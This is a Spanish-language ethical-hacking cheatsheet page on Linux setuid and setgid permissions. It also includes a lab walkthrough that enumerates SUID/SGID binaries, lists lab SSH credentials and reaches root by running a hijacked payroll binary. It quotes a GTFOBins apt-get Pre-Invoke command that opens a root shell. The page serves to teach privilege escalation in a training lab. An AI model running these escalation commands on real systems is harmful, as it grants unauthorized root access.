
# Permisos especiales

## <mark style="color:purple;">SETUID</mark>

El permiso Set User ID upon Execution (`setuid`) permite que un usuario ejecute un programa o script con los permisos de otro usuario, normalmente con privilegios elevados. El bit `setuid` aparece como un `s` :

```shell-session
afsh4ck@kali$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs
```

Es posible realizar ingeniería inversa del programa con el bit SETUID activado, identificar una vulnerabilidad y explotarla para aumentar nuestros privilegios. Muchos programas tienen funciones adicionales que se pueden aprovechar para ejecutar comandos y, si el bit `setuid` está activado, se pueden usar para nuestro propósito.

## <mark style="color:purple;">SETGID</mark>

El permiso Set-Group-ID (`setgid`) es otro permiso especial que nos permite ejecutar archivos binarios como si fuéramos parte del grupo que los creó. Estos archivos se pueden enumerar utilizando el siguiente comando: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Estos archivos se pueden utilizar de la misma manera que los archivos binarios `setuid` para escalar privilegios.

```shell-session
afsh4ck@kali$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

Este [recurso](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) tiene más información sobre los bits `setuid` y `setgid`, incluido cómo configurar los bits.

***

## <mark style="color:purple;">GTFOBins</mark>

El proyecto [GTFOBins](https://gtfobins.github.io/) es una lista seleccionada de archivos binarios y scripts que un atacante puede usar para eludir las restricciones de seguridad. Cada página detalla las características del programa que se pueden usar para salir de los shells restringidos, aumentar los privilegios, generar conexiones de shell inversas y transferir archivos. Por ejemplo, se puede usar `apt-get` para salir de entornos restringidos y generar un shell agregando un comando Pre-Invoke:

```shell-session
afsh4ck@kali$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

Vale la pena familiarizarnos con tantos GTFOBins como sea posible para identificar rápidamente configuraciones erróneas cuando llegamos a un sistema en el que debemos escalar nuestros privilegios para avanzar.

{% content-ref url="/pages/cwk8zNlCxAUKvjeVPAd3" %}
[GTFOBins](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/gtfobins.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.16.168 (ACADEMY-LPE-NIX02)
User "htb-student"
Password "Academy_LLPE!"
```

### Pregunta 1

Busque un archivo con el bit `setuid` establecido que no se mostró en la salida del comando de sección (ruta completa al binario).

```shell-session
# find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31  2020 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Nov 29  2022 /bin/su
-rwsr-xr-x 1 root root 109000 Jan 30  2018 /bin/sed
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 100760 May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 436552 Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 22520 Jan 12  2022 /usr/bin/pkexec
-rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter
-rwsr-xr-x 1 root root 40344 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75824 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 10312 Sep 20  2022 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31  2020 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 113336 May 24  2021 /sbin/mount.nfs
```

Concretamente el archivo es `/bin/sed`, pero encontramos otros archivos más interesantes.

De la salida del comando `find`, los archivos con el bit **SUID** activado son aquellos que permiten que un usuario ejecute el archivo con los permisos del propietario del archivo, que generalmente es `root`.

Entre los archivos listados, parece que hay dos que no son comunes o esperados del sistema estándar:

1. `/home/htb-student/shared_obj_hijack/payroll`
2. `/home/mrb3n/payroll`

Estos archivos se encuentran en directorios de usuarios y no forman parte de los binarios del sistema (como `/bin` o `/usr/bin`). Podrían ser binarios personalizados o scripts creados con el propósito de explotar el bit SUID para escalar privilegios o realizar tareas administrativas.

#### Archivo destacado con SUID:

* **`/home/htb-student/shared_obj_hijack/payroll`**: Este archivo parece haber sido creado específicamente en el entorno actual. Es el que vamos investigar más a fondo, ya que es poco común que un archivo de este tipo esté en el directorio de un usuario, y podría haber sido creado para el propósito de pruebas o explotación.

#### Ejecutando el binario

Probamos a ejecutar el binario y buuum, nos convertimos en root!

```shell-session
htb-student@NIX02:~/shared_obj_hijack$ ./payroll 
***************Inlane Freight Employee Database***************

Malicious library loaded
# whoami 
root
```

### Pregunta 2

Busque un archivo con el bit `setgid` establecido que no se mostró en la salida del comando de sección (ruta completa al binario).

```shell-session
# find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null   
-rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
-rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter
```

El archivo con el **bit setgid** activado que no se mostró en la salida del comando de la sección es:

```
/usr/bin/facter
```
